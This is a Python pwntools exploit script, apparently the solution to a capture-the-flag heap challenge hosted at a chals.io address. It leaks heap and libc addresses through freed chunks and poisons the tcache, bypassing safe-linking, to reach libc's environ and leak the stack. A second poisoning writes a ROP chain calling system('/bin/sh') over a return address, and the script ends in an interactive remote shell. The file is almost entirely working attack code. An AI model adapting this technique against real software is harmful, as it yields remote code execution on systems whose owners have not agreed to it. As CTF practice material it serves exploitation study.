import re
import sys
from pwn import *

path = './pwnme_patched'
host = '0.cloud.chals.io'
port = 10605
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

libc = ELF('./libc.so.6')

if len(sys.argv) > 1:
    p = gdb.debug(path, '''
        c
    ''', api=True, aslr=True)
else:
    p = remote(host, port)

def b():
    p.gdb.interrupt_and_wait()
    input("press any key to resume")
def numb(num):
    return str(num).encode('ascii')

def alloc(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', numb(idx))
    p.sendlineafter(b'> ', numb(size))
    p.sendlineafter(b'> ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', numb(idx))

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', numb(idx))
    p.sendlineafter(b'> ', data)

def view(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'> ', numb(idx))
    return p.recvuntil(b'You are', drop=True)

# allocate unsorted bin chunk for libc leak
alloc(0, 0x420, b'AAAAAAAA')

# allocate tcache size chunk for heap leak
# this also prevents unsorted bin chunk from coalescing on free
alloc(1, 24, b'BBBBBBBB')

# allocate another 0x20 size chunk for poisoning later
alloc(2, 24, b'CCCCCCCC')

# free 0x20 size chunks into tcache
# looks like this:
# [2] -> [1]
delete(1)
delete(2)

# free unsorted bin size chunk to put libc address
delete(0)

# get heap leak
leak = u64(view(1)[:-1].ljust(8, b'\x00'))
heap = leak << 12
log.info(f"heap base: 0x{heap:x}")

# get libc leak
leak = u64(view(0)[:-1].ljust(8, b'\x00'))
libc.address = leak - (0x7f1d52750cc0 - 0x7f1d5255e000)
log.info(f"libc base: 0x{libc.address:x}")

# do tcache poisoning
mask = heap >> 12
edit(2, p64(mask ^ libc.symbols['environ']))

# allocate two chunks
# second chunk will be environ chunk
alloc(2, 0, b'')
alloc(2, 0, b'')

# get stack leak
stack = u64(view(2)[:-1].ljust(8, b'\x00'))
log.info(f"stack leak: 0x{stack:x}")

# offset stack leak to return address location
stack -= 336 + 8

# do poisoning again to get write on stack woohoo im having so much fun
alloc(1, 0x40-8, b'')
alloc(2, 0x40-8, b'')
delete(1)
delete(2)
edit(2, p64(mask ^ stack))

pop_rdi = libc.address + 0x000000000002daa2
binsh = next(libc.search(b'/bin/sh\x00'))

payload = b'A' * 8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols['system'])

alloc(2, 0x40-8, b'')
alloc(2, 0x40-8, payload)

p.interactive()